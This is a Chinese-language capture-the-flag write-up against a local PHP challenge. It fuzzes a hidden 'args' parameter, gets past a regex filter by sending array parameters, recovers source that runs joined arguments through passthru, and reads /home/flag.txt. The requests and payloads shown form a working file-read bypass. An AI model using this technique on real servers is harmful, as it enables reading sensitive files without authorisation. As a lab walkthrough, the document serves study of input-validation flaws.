## 侦察与探测

访问首页 `/`
- 响应
    ```http
    HTTP/1.1 200 OK
    Server: Apache/2.4.25 (Debian)
    ```
    ```html
    <b>Command arguments not found!</b>
    ```

暴破根目录，探测参数
- 模式
    ```http
    GET /?§§=x HTTP/1.1
    Host: 127.0.0.1:8000
    ```

- 特异请求/响应
    ```http
    GET /?args=x HTTP/1.1
    ```
    - 响应，解码后
        ```log
        Only 'cat <file>' command allowed
        ```

- 进行一系列测试
    - 尝试打印 index
        `/?args=<@urlencode>cat index.php</@urlencode>`

        ```html
        <b>preg_match() has just detected invalid characters! ¯\_(ツ)_/¯</b>
        ```
        - 空格被视为无效字符

    - 数组型
        `GET /?args[]=cat&args[]=index.php HTTP/1.1`

        ```php
        <?php
            
            // L2hvbWUvZmxhZy50eHQ=

            if (isset($_GET['args'])){

                if(!is_array($_GET['args'])){
                    $args = array();
                    $args[] = $_GET['args'];
                } else {
                    $args = $_GET['args'];
                }

                for ( $i=0; $i<count($args); $i++ ){
                    if (!preg_match('/^[\w\/|\.]*$/', $args[$i])){
                        die('<b>preg_match() has just detected invalid characters! ¯\_(ツ)_/¯</b>');
                    }
                }
            } else {
                die('<b>Command arguments not found!</b>');
            }

            $command = implode(" ", $args);

            if(preg_match('/^(\/bin\/cat|cat) +[\w\.\/]*$/',$command)){
                echo passthru($command . " 2>&1");
            } else {
                echo 'Only \'cat &lt;file&gt;\' command allowed';
            }

        ```
        - 解码开头注释
            ```
            /home/flag.txt
            ```
        - 分析：
            - 读取参数列表，使用空格拼接后执行

- 访问注释端点
    ```http
    GET /?args[]=cat&args[]=/home/flag.txt HTTP/1.1
    ```
    - 响应得到 flag
